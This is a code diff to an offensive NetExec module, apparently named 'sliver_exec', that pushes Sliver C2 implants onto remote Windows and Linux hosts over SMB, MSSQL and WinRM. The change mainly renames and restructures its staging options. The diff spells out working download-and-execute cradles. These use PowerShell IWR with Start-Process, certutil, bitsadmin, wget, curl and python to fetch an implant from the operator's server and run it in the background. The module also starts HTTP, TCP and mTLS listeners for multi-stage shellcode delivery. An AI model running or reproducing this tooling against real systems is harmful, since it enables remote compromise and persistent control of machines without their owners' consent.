@@ -225,7 +225,7 @@ class GrpcWorker:
             
             return resp.JobID
         else:
-            raise ValueError(f"Unsupported STAGER_PROTOCOL: {protocol} (use 'tcp', 'http', or 'https')")
+            raise ValueError(f"Unsupported SHELLCODE_PROTOCOL: {protocol} (use 'tcp', 'http', or 'https')")
 
     async def _do_generate_shellcode(self, ic):
         """Generate shellcode directly using Generate RPC."""
@@ -720,13 +720,12 @@ class NXCModule:
         self.rhost = None
         self.rport = None
         self.cleanup_mode = "always"  # "always", "success", or "never"
-        self.staging = False
-        self.staging_direct = False
-        self.stager_rhost = None
-        self.stager_rport = None
-        self.stager_port = None  # For HTTP staging
-        self.stager_protocol = "http"
-        self.staging_method = "powershell"  # Windows: powershell, certutil, bitsadmin; Linux: wget, curl, python
+        self.staging_mode = None  # "download", "shellcode", "none", or None
+        self.shellcode_listener_host = None
+        self.shellcode_listener_port = None
+        self.http_staging_port = None
+        self.shellcode_protocol = "http"
+        self.download_tool = "powershell"  # Windows: powershell, certutil, bitsadmin; Linux: wget, curl, python
         self.beacon_interval = 5  # seconds (default: 5s)
         self.beacon_jitter = 3  # seconds (default: 3s)
         self.os_type = None
@@ -755,11 +754,10 @@ class NXCModule:
         # Known options
         known_options = {
             "IMPLANT_BASE_PATH", "RHOST", "RPORT", "CLEANUP", "OS", "ARCH",
-            "SHARE", "PROFILE", "WAIT", "FORMAT", "STAGING", "STAGER_RHOST", 
-            "STAGER_RPORT", "STAGER_PROTOCOL", "STAGER_PORT", "STAGING_METHOD",
+            "SHARE", "PROFILE", "WAIT", "FORMAT", "STAGING",
             "BEACON_INTERVAL", "BEACON_JITTER",
-            # New simplified staging options
-            "STAGING_PORT", "DOWNLOAD_TOOL",
+            # New staging options
+            "HTTP_STAGING_PORT", "SHELLCODE_LISTENER_HOST", "SHELLCODE_LISTENER_PORT", "SHELLCODE_PROTOCOL", "DOWNLOAD_TOOL",
             # New cleanup mode option
             "CLEANUP_MODE"
         }
@@ -768,7 +766,7 @@ class NXCModule:
         for key in module_options:
             if key not in known_options:
                 context.log.fail(f"Unknown option: {key}")
-                context.log.fail("Valid options: RHOST, RPORT, STAGING, STAGING_PORT, DOWNLOAD_TOOL, BEACON_INTERVAL, BEACON_JITTER, OS, ARCH, CLEANUP_MODE, WAIT, PROFILE")
+                context.log.fail("Valid options: RHOST, RPORT, STAGING, HTTP_STAGING_PORT, SHELLCODE_LISTENER_HOST, SHELLCODE_LISTENER_PORT, SHELLCODE_PROTOCOL, DOWNLOAD_TOOL, BEACON_INTERVAL, BEACON_JITTER, OS, ARCH, CLEANUP_MODE, WAIT, PROFILE")
                 context.log.fail("See: nxc <protocol> -M sliver_exec --options")
                 sys.exit(1)
 
@@ -820,68 +818,66 @@ class NXCModule:
                 sys.exit(1)
 
         # For staging, validate stager options if provided
-        staging_value = module_options.get("STAGING", "False")
-        # Support both old style (True/False) and new style (http/tcp/https/direct)
-        if staging_value.lower() in ("true", "1", "yes", "http", "tcp", "https", "direct"):
-            staging_enabled = True
-            # Validate STAGING value if it's a protocol
-            if staging_value.lower() in ("http", "tcp", "https"):
-                stager_protocol = staging_value.lower()
-            elif staging_value.lower() == "direct":
-                # Direct staging opt-out: handled later in _parse_module_options
-                pass
-            else:
-                # Old style: check STAGER_PROTOCOL
-                stager_protocol = module_options.get("STAGER_PROTOCOL", "http").lower()
-                if stager_protocol not in ["http", "tcp", "https"]:
-                    context.log.fail("STAGER_PROTOCOL must be 'http', 'tcp', or 'https' (default: http)")
-                    sys.exit(1)
-        else:
-            staging_enabled = False
-            
+        staging_value = module_options.get("STAGING", "none")
+        staging_value = staging_value.lower()
+        # Validate STAGING value
+        if staging_value not in ("download", "shellcode", "none", "false", "0", "no"):
+            context.log.fail("STAGING must be 'download', 'shellcode', or 'none' (default: none)")
+            sys.exit(1)
+
+        staging_enabled = staging_value in ("download", "shellcode")
+
         if staging_enabled:
 
-            # Validate STAGER_RHOST if provided
-            if module_options.get("STAGER_RHOST"):
+            # Validate SHELLCODE_LISTENER_HOST if provided (for shellcode staging)
+            if module_options.get("SHELLCODE_LISTENER_HOST"):
                 import ipaddress
                 try:
-                    ipaddress.IPv4Address(module_options["STAGER_RHOST"])
+                    ipaddress.IPv4Address(module_options["SHELLCODE_LISTENER_HOST"])
                 except ipaddress.AddressValueError:
-                    context.log.fail(f"STAGER_RHOST must be a valid IPv4 address: {module_options['STAGER_RHOST']}")
+                    context.log.fail(f"SHELLCODE_LISTENER_HOST must be a valid IPv4 address: {module_options['SHELLCODE_LISTENER_HOST']}")
                     sys.exit(1)
 
-            # Validate STAGER_RPORT if provided
-            if module_options.get("STAGER_RPORT"):
+            # Validate SHELLCODE_LISTENER_PORT if provided (for shellcode staging)
+            if module_options.get("SHELLCODE_LISTENER_PORT"):
                 try:
-                    port = int(module_options["STAGER_RPORT"])
+                    port = int(module_options["SHELLCODE_LISTENER_PORT"])
                     if not (1 <= port <= 65535):
                         raise ValueError()
                 except (ValueError, TypeError):
-                    context.log.fail(f"STAGER_RPORT must be a valid port number (1-65535): {module_options['STAGER_RPORT']}")
+                    context.log.fail(f"SHELLCODE_LISTENER_PORT must be a valid port number (1-65535): {module_options['SHELLCODE_LISTENER_PORT']}")
                     sys.exit(1)
 
-            # Validate STAGER_PORT or STAGING_PORT if provided (support both old and new names)
-            staging_port = module_options.get("STAGING_PORT") or module_options.get("STAGER_PORT")
-            if staging_port:
+            # Validate HTTP_STAGING_PORT if provided (for download staging)
+            http_staging_port = module_options.get("HTTP_STAGING_PORT")
+            if http_staging_port:
                 try:
-                    port = int(staging_port)
+                    port = int(http_staging_port)
                     if not (1 <= port <= 65535):
                         raise ValueError()
                 except (ValueError, TypeError):
-                    context.log.fail(f"STAGING_PORT must be a valid port number (1-65535): {staging_port}")
+                    context.log.fail(f"HTTP_STAGING_PORT must be a valid port number (1-65535): {http_staging_port}")
                     context.log.fail("")
-                    context.log.fail("Example: -o STAGING=http STAGING_PORT=8080")
+                    context.log.fail("Example: -o STAGING=download HTTP_STAGING_PORT=8080")
                     sys.exit(1)
 
-            # Validate STAGING_METHOD or DOWNLOAD_TOOL if provided (support both old and new names)
-            staging_method = module_options.get("DOWNLOAD_TOOL") or module_options.get("STAGING_METHOD")
-            if staging_method:
-                staging_method = staging_method.lower()
+            # Validate SHELLCODE_PROTOCOL if provided (for shellcode staging)
+            shellcode_protocol = module_options.get("SHELLCODE_PROTOCOL")
+            if shellcode_protocol:
+                shellcode_protocol = shellcode_protocol.lower()
+                if shellcode_protocol not in ["http", "tcp", "https"]:
+                    context.log.fail("SHELLCODE_PROTOCOL must be 'http', 'tcp', or 'https' (default: http)")
+                    sys.exit(1)
+
+            # Validate DOWNLOAD_TOOL if provided (for download staging)
+            download_tool = module_options.get("DOWNLOAD_TOOL")
+            if download_tool:
+                download_tool = download_tool.lower()
                 valid_methods = ["powershell", "certutil", "bitsadmin", "wget", "curl", "python"]
-                if staging_method not in valid_methods:
+                if download_tool not in valid_methods:
                     context.log.fail(f"DOWNLOAD_TOOL must be one of: {', '.join(valid_methods)} (default: powershell)")
                     context.log.fail("")
-                    context.log.fail("Example: -o STAGING=http DOWNLOAD_TOOL=certutil")
+                    context.log.fail("Example: -o STAGING=download DOWNLOAD_TOOL=certutil")
                     sys.exit(1)
         
         # Validate CLEANUP_MODE if provided
@@ -953,67 +949,62 @@ class NXCModule:
         
         cleanup_value = module_options.get("CLEANUP_MODE", "always")
         self.cleanup_mode = str(cleanup_value).lower()
-        
 
-        # Parse STAGING option (supports both old and new syntax)
-        # Old: STAGING=True/False + STAGER_PROTOCOL=http/tcp/https
-        # New: STAGING=http/tcp/https/direct (protocol embedded in STAGING value)
-        staging_value = module_options.get("STAGING", "False")
-        if staging_value.lower() in ("http", "tcp", "https"):
-            # New syntax: STAGING=http/tcp/https
-            self.staging = True
-            self.stager_protocol = staging_value.lower()
-        elif staging_value.lower() == "direct":
-            # Direct opt-out: disable staging explicitly
-            self.staging = False
-            self.staging_direct = True
-            self.stager_protocol = "http"  # Default value (unused when staging disabled)
-        elif staging_value.lower() in ("true", "1", "yes"):
-            # Old syntax: STAGING=True + STAGER_PROTOCOL
-            self.staging = True
-            self.stager_protocol = (module_options.get("STAGER_PROTOCOL") or "http").lower()
+
+        # Parse STAGING option
+        staging_value = module_options.get("STAGING", "none")
+        if staging_value.lower() == "download":
+            # Download staging mode: implant downloaded via HTTP
+            self.staging_mode = "download"
+        elif staging_value.lower() == "shellcode":
+            # Shellcode staging mode: bootstrap downloads shellcode via HTTP/TCP/HTTPS
+            self.staging_mode = "shellcode"
         else:
-            # Staging disabled
-            self.staging = False
-            self.stager_protocol = "http"  # Default value for when staging is disabled
-            
+            # None or "none": no staging
+            self.staging_mode = None
+
         self.os_type = module_options.get("OS", None)
         self.arch = module_options.get("ARCH", None)
         self.share_config = module_options.get("SHARE", None)  # Optional, used by SMB
         self.wait_seconds = int(module_options.get("WAIT", "90"))
-        
+
         # Parse beacon timing options (defaults: 5s interval, 3s jitter)
         self.beacon_interval = int(module_options.get("BEACON_INTERVAL", "5"))
         self.beacon_jitter = int(module_options.get("BEACON_JITTER", "3"))
-        
+
         # PROFILE mode
         self.profile = module_options.get("PROFILE", None)
         if self.profile:
             context.log.display(f"Using Sliver profile: {self.profile}")
-        
+
         # Parse staging options
-        if self.staging:
-            # STAGER_RHOST defaults to RHOST (same server for staging and C2)
-            self.stager_rhost = module_options.get("STAGER_RHOST") or self.rhost
-            
-            # STAGER_RPORT defaults to RPORT if not specified
-            stager_rport_value = module_options.get("STAGER_RPORT")
-            self.stager_rport = int(stager_rport_value) if stager_rport_value is not None else self.rport
-            
-            # STAGER_PORT / STAGING_PORT (for HTTP download staging) - support both old and new names
-            # New name: STAGING_PORT, Old name: STAGER_PORT
-            stager_port_value = module_options.get("STAGING_PORT") or module_options.get("STAGER_PORT")
-            self.stager_port = int(stager_port_value) if stager_port_value is not None else 8080
-            
-            # STAGING_METHOD / DOWNLOAD_TOOL - support both old and new names
-            # New name: DOWNLOAD_TOOL, Old name: STAGING_METHOD
-            staging_method_value = module_options.get("DOWNLOAD_TOOL") or module_options.get("STAGING_METHOD")
-            self.staging_method = staging_method_value.lower() if staging_method_value is not None else "powershell"
-            
+        if self.staging_mode == "download":
+            # Parse HTTP staging options
+            http_staging_port_value = module_options.get("HTTP_STAGING_PORT")
+            self.http_staging_port = int(http_staging_port_value) if http_staging_port_value is not None else 8080
+
+            # Parse download tool
+            download_tool_value = module_options.get("DOWNLOAD_TOOL")
+            self.download_tool = download_tool_value.lower() if download_tool_value is not None else "powershell"
+
             # Display staging configuration
-            context.log.display(f"HTTP staging: {self.stager_rhost}:{self.stager_port}")
-            context.log.display(f"Staging method: {self.staging_method}")
+            context.log.display(f"HTTP download staging: {self.rhost}:{self.http_staging_port}")
+            context.log.display(f"Download tool: {self.download_tool}")
             context.log.display(f"Final C2: {self.rhost}:{self.rport} (mTLS)")
+        elif self.staging_mode == "shellcode":
+            # Parse shellcode staging options
+            self.shellcode_listener_host = module_options.get("SHELLCODE_LISTENER_HOST") or self.rhost
+            shellcode_listener_port_value = module_options.get("SHELLCODE_LISTENER_PORT")
+            self.shellcode_listener_port = int(shellcode_listener_port_value) if shellcode_listener_port_value is not None else self.rport
+
+            # Parse shellcode protocol
+            shellcode_protocol_value = module_options.get("SHELLCODE_PROTOCOL")
+            self.shellcode_protocol = shellcode_protocol_value.lower() if shellcode_protocol_value is not None else "http"
+
+            # Display staging configuration
+            context.log.display(f"Shellcode staging: {self.shellcode_protocol.upper()} listener on {self.shellcode_listener_host}:{self.shellcode_listener_port}")
+            context.log.display(f"Final C2: {self.rhost}:{self.rport} (mTLS)")
+
         
         fmt = module_options.get("FORMAT", "exe").lower()
         if fmt not in ["exe", "executable"]:
@@ -1192,74 +1183,75 @@ class NXCModule:
         protocol = connection.__class__.__name__.lower()
         handler = self.get_handler(protocol)
 
-        # Auto-enable HTTP staging for MSSQL (unless explicitly opted out with STAGING=direct)
-        if protocol == "mssql" and not self.staging_direct:
+        # Auto-enable HTTP download staging for MSSQL (unless explicitly opted out)
+        if protocol == "mssql" and self.staging_mode != "none":
             # Enable HTTP download staging as default for MSSQL
-            self.staging = True
-            self.stager_port = self.stager_port or 8080
-            
-            # Default to certutil unless user specified a different download tool
-            if not self.staging_method or self.staging_method == "powershell":
-                self.staging_method = "certutil"
+            self.staging_mode = "download"
+            self.http_staging_port = self.http_staging_port or 8080
 
-        # Auto-enable HTTP staging for SMB Windows targets (unless explicitly opted out)
-        if protocol == "smb" and os_type == "windows" and not self.staging_direct:
-            self.staging = True
-            self.stager_port = self.stager_port or 8080
+            # Default to certutil unless user specified a different download tool
+            if not self.download_tool or self.download_tool == "powershell":
+                self.download_tool = "certutil"
+
+        # Auto-enable HTTP download staging for SMB Windows targets (unless explicitly opted out)
+        if protocol == "smb" and os_type == "windows" and self.staging_mode != "none":
+            self.staging_mode = "download"
+            self.http_staging_port = self.http_staging_port or 8080
             # Default to PowerShell for SMB (most reliable on modern Windows)
-            if not self.staging_method:
-                self.staging_method = "powershell"
+            if not self.download_tool:
+                self.download_tool = "powershell"
+
 
         try:
             full_remote_path = None
             listener_job_id = None
             website_name = None
             
-            if self.staging:
+            if self.staging_mode in ("download", "shellcode"):
                 # Determine staging approach:
-                # - If STAGER_PORT is set, use HTTP download staging
-                # - Otherwise, use TCP/HTTP shellcode injection staging
-                if hasattr(self, 'stager_port') and self.stager_port:
+                # - If staging_mode == "download", use HTTP download staging
+                # - If staging_mode == "shellcode", use TCP/HTTP shellcode injection staging
+                if self.staging_mode == "download":
                     # HTTP download staging approach
-                    context.log.display(f"Using HTTP download staging ({self.staging_method})")
+                    context.log.display(f"Using HTTP download staging ({self.download_tool})")
                     full_remote_path, listener_job_id, website_name = self._run_beacon_staged_http(
                         context, connection, os_type, arch, implant_name, handler
                     )
-                else:
+                else:  # shellcode mode
                     # TCP/HTTP shellcode injection staging
                     if protocol != "winrm":
-                        context.log.fail("Staging currently only supported on WinRM")
+                        context.log.fail("Shellcode staging currently only supported on WinRM")
                         sys.exit(1)
                     self.stage_port = self.rport  # Define if needed
                     # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
                     _ = self._get_worker_and_connect()
-                    
+
                     # Build profile for stage2 (defines profile_name; already has connect guard)
                     _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)
-                    
+
                     # Gen bootstrap + prep stage2 (this also registers the stage)
                     self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)
-                    
+
                     # Now start stager listener with the profile name and stage data
-                    self._worker_submit('start_stager_listener', 
-                                      self.stager_rhost or self.rhost, 
-                                      self.stager_rport or self.rport, 
-                                      self.stager_protocol,
+                    self._worker_submit('start_stager_listener',
+                                      self.shellcode_listener_host or self.rhost,
+                                      self.shellcode_listener_port or self.rport,
+                                      self.shellcode_protocol,
                                       profile_name,
                                       self.stager_data)
-                    context.log.info(f"Started {self.stager_protocol.upper()} stager listener on {self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}")
-                    
+                    context.log.info(f"Started {self.shellcode_protocol.upper()} stager listener on {self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}")
+
                     # Now start mTLS listener for stage 2
                     self.mtls_port = self.rport  # Use RPORT for stage 2 mTLS
                     _ = self._get_worker_and_connect()  # Re-ensure for mTLS
                     self._worker_submit('start_mtls_listener', self.rhost, self.mtls_port)
                     context.log.info(f"Started mTLS C2 listener for stage 2 on {self.rhost}:{self.mtls_port}")
-                    
+
                     success = handler.stage_execute(context, connection, os_type, self.stager_data)
                     if not success:
                         context.log.fail("Stager execution failed")
                         sys.exit(1)
-                    context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.stager_protocol.upper()})")
+                    context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.shellcode_protocol.upper()})")
                     full_remote_path = None  # In-memory; no cleanup needed
             else:
                 self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
@@ -1282,7 +1274,7 @@ class NXCModule:
                                             website_name=website_name)
 
         finally:
-            if not self.staging:
+            if self.staging_mode is None:
                 self._cleanup_local_temp(self.local_implant_path)
 
     def _build_wmic_command(self, inner_cmd):
@@ -1309,7 +1301,7 @@ class NXCModule:
         
         if is_windows:
             # Windows staging methods
-            if self.staging_method == "powershell":
+            if self.download_tool == "powershell":
                 # PowerShell Invoke-WebRequest download + execute
                 # SMB requires 'cmd /c' wrapper for PowerShell
                 if protocol and protocol.lower() == "smb":
@@ -1324,39 +1316,39 @@ class NXCModule:
                         f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
                         f'Start-Process $env:TEMP\\{implant_name}"'
                     )
-            elif self.staging_method == "certutil":
+            elif self.download_tool == "certutil":
                 # Certutil download + execute with WMIC for true async
                 cmd = self._build_wmic_command(
                     f'certutil -urlcache -f {download_url} '
                     f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                 )
-            elif self.staging_method == "bitsadmin":
+            elif self.download_tool == "bitsadmin":
                 # BITSAdmin download + execute with WMIC for true async
                 cmd = self._build_wmic_command(
                     f'bitsadmin /transfer job /download /priority high '
                     f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                 )
             else:
-                raise ValueError(f"Staging method '{self.staging_method}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
+                raise ValueError(f"Staging method '{self.download_tool}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
         else:
             # Linux staging methods
             tmp_path = f"/tmp/{implant_name}"
             
-            if self.staging_method == "wget":
+            if self.download_tool == "wget":
                 # wget download + execute in background
                 cmd = (
                     f'wget -q -O {tmp_path} {download_url} && '
                     f'chmod +x {tmp_path} && '
                     f'nohup {tmp_path} > /dev/null 2>&1 &'
                 )
-            elif self.staging_method == "curl":
+            elif self.download_tool == "curl":
                 # curl download + execute in background
                 cmd = (
                     f'curl -s -o {tmp_path} {download_url} && '
                     f'chmod +x {tmp_path} && '
                     f'nohup {tmp_path} > /dev/null 2>&1 &'
                 )
-            elif self.staging_method == "python":
+            elif self.download_tool == "python":
                 # Python urllib download + execute in background
                 cmd = (
                     f'python3 -c "import urllib.request; '
@@ -1365,7 +1357,7 @@ class NXCModule:
                     f'nohup {tmp_path} > /dev/null 2>&1 &'
                 )
             else:
-                raise ValueError(f"Staging method '{self.staging_method}' not supported for Linux. Use: wget, curl, or python")
+                raise ValueError(f"Staging method '{self.download_tool}' not supported for Linux. Use: wget, curl, or python")
         
         return cmd
 
@@ -1387,7 +1379,7 @@ class NXCModule:
         
         if protocol == "winrm":
             # For WinRM, use ps_execute if it's a PowerShell command
-            if self.staging_method == "powershell":
+            if self.download_tool == "powershell":
                 # Execute the PowerShell portion directly
                 inner_ps = f"IWR '{download_url}' -OutFile $env:TEMP\\{implant_name}; Start-Process $env:TEMP\\{implant_name}"
                 result = connection.ps_execute(inner_ps, get_output=True)
@@ -1400,8 +1392,8 @@ class NXCModule:
             # MSSQL: Execute download cradle via xp_cmdshell
             
             # Reject Linux download tools (MSSQL targets Windows only)
-            if self.staging_method in ["wget", "curl", "python"]:
-                context.log.fail(f"Download tool '{self.staging_method}' not supported for MSSQL (Windows-only protocol)")
+            if self.download_tool in ["wget", "curl", "python"]:
+                context.log.fail(f"Download tool '{self.download_tool}' not supported for MSSQL (Windows-only protocol)")
                 sys.exit(1)
             
             # Increase socket timeout for download operation (17MB implant can take 30+ seconds)
@@ -1426,15 +1418,15 @@ class NXCModule:
             # SMB: Execute download cradle via smbexec
             
             # Reject Linux download tools (SMB staging is Windows-only)
-            if self.staging_method in ["wget", "curl", "python"]:
-                context.log.fail(f"Download tool '{self.staging_method}' not supported for SMB staging (Windows-only)")
-                context.log.fail("Use STAGING=direct for Linux/Samba targets, or use powershell/certutil/bitsadmin")
+            if self.download_tool in ["wget", "curl", "python"]:
+                context.log.fail(f"Download tool '{self.download_tool}' not supported for SMB staging (Windows-only)")
+                context.log.fail("Use STAGING=none for Linux/Samba targets, or use powershell/certutil/bitsadmin")
                 sys.exit(1)
             
             # Check if target is Linux/Samba - staging not supported
             if os_type != "windows":
                 context.log.fail("SMB HTTP staging only supported for Windows targets")
-                context.log.fail("Use STAGING=direct for Linux/Samba targets")
+                context.log.fail("Use STAGING=none for Linux/Samba targets")
                 sys.exit(1)
             
             # Execute via smbexec
@@ -1491,9 +1483,9 @@ class NXCModule:
         context.log.info(f"Implant uploaded to website (path: {implant_path})")
         
         # 3. Start HTTP listener with website
-        stager_host = self.stager_rhost or self.rhost
-        stager_port = self.stager_port
-        
+        stager_host = self.rhost
+        stager_port = self.http_staging_port
+
         context.log.display(f"Starting HTTP listener on {stager_host}:{stager_port}...")
         try:
             listener_resp = self._worker_submit('start_http_listener_with_website',
@@ -1506,20 +1498,20 @@ class NXCModule:
             if "ALREADY_EXISTS" in error_msg or "in use" in error_msg:
                 context.log.fail(f"Port {stager_port} is already in use by another listener.")
                 context.log.fail("Solutions:")
-                context.log.fail("  1. Use a different port: -o STAGING_PORT=8081")
+                context.log.fail("  1. Use a different port: -o HTTP_STAGING_PORT=8081")
                 context.log.fail("  2. In Sliver console, list active listeners with: jobs, kill existing listener: jobs -k <job_id>")
                 sys.exit(1)
             raise
         listener_job_id = listener_resp.JobID
         context.log.info(f"HTTP listener started (Job ID: {listener_job_id})")
-        
-        # 4. Build download cradle based on OS type and staging method
+
+        # 4. Build download cradle based on OS type and download tool
         download_url = f"http://{stager_host}:{stager_port}{implant_path}"
         
         # Build download cradle command based on OS and staging method
         try:
             cmd = self._build_download_cradle(os_type, download_url, implant_name, protocol)
-            context.log.debug(f"Using {self.staging_method} staging method")
+            context.log.debug(f"Using {self.download_tool} staging method")
         except ValueError as e:
             context.log.fail(str(e))
             sys.exit(1)
@@ -1803,14 +1795,15 @@ class NXCModule:
             self._worker_submit('stage_implant_build', stage_req)
             context.log.debug("Stage 2 registered on listener")
             
-            # Construct download URL for bootstrap based on stager protocol
+            # Construct download URL for bootstrap based on shellcode protocol
             # Bootstrap will fetch Stage 2 from this URL at runtime
-            if self.stager_protocol == "http":
-                stage_url = f"http://{self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}/{stage2_profile_name}"
-            elif self.stager_protocol == "https":
-                stage_url = f"https://{self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}/{stage2_profile_name}"
+            if self.shellcode_protocol == "http":
+                stage_url = f"http://{self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}/{stage2_profile_name}"
+            elif self.shellcode_protocol == "https":
+                stage_url = f"https://{self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}/{stage2_profile_name}"
             else:
-                stage_url = f"tcp://{self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}/{stage2_profile_name}"
+                stage_url = f"tcp://{self.shellcode_listener_host or self.rhost}:{self.shellcode_listener_port or self.rport}/{stage2_profile_name}"
+
             
             context.log.debug(f"Stage URL: {stage_url}")
             
